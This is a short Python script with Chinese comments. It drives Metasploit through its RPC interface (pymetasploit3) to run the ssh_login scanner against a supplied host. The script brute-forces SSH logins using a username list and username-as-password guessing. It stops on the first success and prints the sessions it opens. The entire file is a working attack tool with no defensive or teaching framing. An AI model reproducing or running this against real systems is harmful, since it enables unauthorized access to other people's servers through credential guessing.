from pymetasploit3.msfrpc import MsfRpcClient

def ssh_attack(host):
    # 建立連線
    client = MsfRpcClient(username="msf", password="123", server="127.0.0.1", port=55552)
    print("client:", client)

    # 使用metasploit攻擊模組，路徑
    exploit = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
    # print("option:", exploit.options)     # 模組可使用配置項目
    exploit["RHOSTS"] = host
    exploit["STOP_ON_SUCCESS"] = True
    exploit["VERBOSE"] = True
    exploit["USER_FILE"] = "D:/nick_file/unix_users.txt"
    exploit["USER_AS_PASS"] = True
    # 檢查上面配置是否正確
    print("設定執行配置參數:", exploit.runoptions)

    # 執行成功回傳 job_id
    mysession = exploit.execute()
    print("mysession:", mysession)

    # 創建一個新控制台並將其編號存儲在"cid"中
    console_id = client.consoles.console().cid
    print("console_id:", console_id)
    # 使用新控制台
    console = client.consoles.console(console_id)
    print("console:", console)
    # 將控制台上的訊息顯示出來，須等到它執行完成並收集完它的輸出。
    result = console.run_module_with_output(exploit, payload='scanner/ssh/ssh_login')
    print("result:", result)

    # 執行攻擊的session紀錄
    session_list = client.sessions.list
    print("server 執行的攻擊紀錄:", session_list)

    if mysession:
        return True
    else:
        return False